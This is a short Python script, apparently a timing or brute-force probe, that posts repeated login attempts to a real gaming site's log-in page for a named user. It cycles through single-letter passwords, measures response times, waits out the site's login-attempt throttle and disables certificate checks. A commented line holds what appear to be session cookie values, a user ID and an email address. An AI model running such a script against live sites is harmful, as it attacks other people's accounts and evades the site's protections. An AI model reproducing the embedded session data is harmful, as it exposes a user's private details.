import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import time
import string

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

PROXY = True

def makePushPost(url,message,use_json=1):
    p = {}
    c = {} #{"lad_sock_hash":"5f505e09d8b74bcc1282e9899f99ff2a","lad_sock_remember_me":"anonymoosen%40hotmail.com","lad_sock_user_id":"58133","timezone":"America/Denver"}
    if PROXY:
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    else:
        proxies = {}
    headers = {'Accept':'*/*','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'}
    if use_json:
        message = json.dumps(message)
    
    start = time.time()
    r = requests.post(url,headers=headers, params = p,proxies=proxies, cookies = c,data=message,  verify=False)
    response = r.json()
    try:
        while "Too many login" in response['error']:
            time.sleep(60)
            start = time.time()
            r = requests.post(url,headers=headers, params = p,proxies=proxies, cookies = c,data=message,  verify=False)
            response = r.json()   
    except:
        pass
    print("{:04f}".format(time.time()-start))
    #print(response['success'])


    #print(response.replace('\\\\','\\').replace('\\n','\n').replace('\\\\',''))

def main():
    url = "https://www.smashladder.com/log-in"
    for char in string.ascii_lowercase:
        message={"username":"anonymoosen","password":char,"remember":1,"json":1}
        #start = time.time()
        #makePushPost(url,message)
        #print(time.time()-start)
        print(char)
        makePushPost(url,message,0)

if __name__=='__main__':
    main()
